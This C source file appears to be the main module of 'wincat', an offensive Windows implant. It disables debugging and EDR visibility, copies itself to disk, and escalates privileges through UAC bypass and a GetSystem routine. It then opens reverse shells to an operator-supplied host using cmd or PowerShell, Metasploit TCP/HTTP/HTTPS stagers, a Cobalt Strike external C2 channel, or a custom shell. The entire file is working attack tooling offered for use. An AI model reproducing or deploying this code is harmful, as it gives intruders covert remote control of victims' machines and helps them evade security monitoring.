#include <windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "RunAs.h"

#include "DropFile.h"
#include "CheckSystem.h"
#include "BypassUac.h"
#include "GetSystem.h"
#include "ProtectProcess.h"
#include "EDRChecker.h"
#include "BypassAMSI.h" 

#include "RunShell.h"
#include "ReverseHttp.h"
#include "CustomShell.h"
#include "csExternalC2.h"


#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")


//#pragma warning(disable:4996)



BOOL initWSAS() {
    WSADATA wsaData;
    int WSAStartupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (WSAStartupResult != 0) {
        printf("[x] WSAStartup failed: %d.\n", WSAStartupResult);
        return FALSE;
    }
    return TRUE;
}


BOOL PrivEsc(Arguments listAgrument) {
    char portStr[12];
    _itoa_s(listAgrument.port, portStr, sizeof(portStr), 10);

    if (IsRunAsAdmin()) {
        printMsg(STATUS_INFO, LEVEL_DEFAULT, "Process running with admin priv !\n");
        if (!isArgHostSet() && !SaveRHostInfo(listAgrument.host, portStr)) {
            printMsg(STATUS_INFO, LEVEL_DEFAULT, "Error to add the reg key for host/port!\n");
            return FALSE;
        }else
            GetSystem();
    } else {
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process not running with admin priv\n");
        if (IsUserInAdminGroup()) {
            printMsg(STATUS_INFO, LEVEL_DEFAULT, "User is in the admin group\n");
            char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
            if (CurrentProcessPath != NULL) {
                if (GetModuleFileNameA(0, CurrentProcessPath, MAX_PATH) != 0) {
                    if (RunUacBypass(CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir))
                        printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC Bypass worked !\n");
                    else
                        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "UAC Bypass failed");
                }
                free(CurrentProcessPath);
            }
        } else
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "User is no in the admin group");
    }
    return TRUE;
}

BOOL CopyWinNC(const char* wincatDefaultPath) {
    BOOL retVal = FALSE;
    char* currentFilePath = (char*)calloc(MAX_PATH, 1);
    if (currentFilePath != NULL) {
        if (GetModuleFileNameA(NULL, currentFilePath, MAX_PATH) > 0) {
            if (CopyFileA(currentFilePath, wincatDefaultPath, FALSE))
                retVal = TRUE;
        }
        free(currentFilePath);
    }
    return retVal;
}


int wmain(int argc, WCHAR* argv[]){
    Arguments listAgrument;


    //////////////////// Protect process ///////////////////
    //  (Anti-DLL injection)
    //SetHook();

    if (EnableACG())
        printMsg(STATUS_OK, LEVEL_DEFAULT, "Anti-EDR - ACG enable\n");
    else
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Fail to enable ACG\n");

    if (!CheckCodeSection())
        exit(0);

    if (IsDebuggerPresentPEB()) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Debugger detected");
#if !_DEBUG
        exit(0);
#endif
    } else
        printMsg(STATUS_INFO, LEVEL_VERBOSE, "Check For Debugger[2]: OK\n");

    EDRChecker();

    if(!CheckCodeSection())
        exit(0);
    //
    //////////////////// Protect process ///////////////////



    if (!GetArguments(argc, argv, &listAgrument)) {
        if (IsRunAsAdmin() && isArgHostSet()) {
            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
            GetSystem();
        }
        return TRUE;
    }
    


    ////////////////////// Copy Wincat /////////////////////
    // 
    if (!IsFileExist((char*)listAgrument.wincatDefaultPath)) {
        if (CreateDirectoryA(listAgrument.wincatDefaultDir, NULL) != ERROR_PATH_NOT_FOUND)
            if (!CopyWinNC(listAgrument.wincatDefaultPath))
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to copy wincat to '%s'", listAgrument.wincatDefaultPath);
    }
    //
    ////////////////////// Copy Wincat /////////////////////



    if (listAgrument.Detached && argc > 3)
        RunProcessDetached(argc, argv);
    else {
        if (listAgrument.toDROP != Nothing)
            DropFiles(listAgrument.wincatDefaultDir, listAgrument.toDROP);
        if (argc >= 3) {
            if (listAgrument.GetSystem) {
                ProtectProcess();
                PrivEsc(listAgrument);
                return FALSE;
            } else if (initWSAS()) {
                switch (listAgrument.payloadType) {
                case PAYLOAD_RECV_CMD:
                case PAYLOAD_RECV_PS:
                    if (listAgrument.lpszUsername[0] == 0) {
                        ProtectProcess();
                        RunShell(listAgrument);
                    }else
                        RunShellAs(listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_TCP:
                    ProtectProcess();
                    MsfReverseTcp(listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_HTTP:
                    ProtectProcess();
                    StagerReverseHTTP(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_MSF_RECV_HTTPS:
                    ProtectProcess();
                    StagerReverseHTTPS(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CS_EXTERNAL_C2:
                    ProtectProcess();
                    csExternalC2(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CUSTOM_SHELL:
                    ProtectProcess();
                    CustomShell(listAgrument.host, listAgrument.port);
                    break;
                default:
                    printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Argument error");
                    break;
                }
                WSACleanup();
            } else
                return TRUE;            
        }
    }
    return FALSE;
}

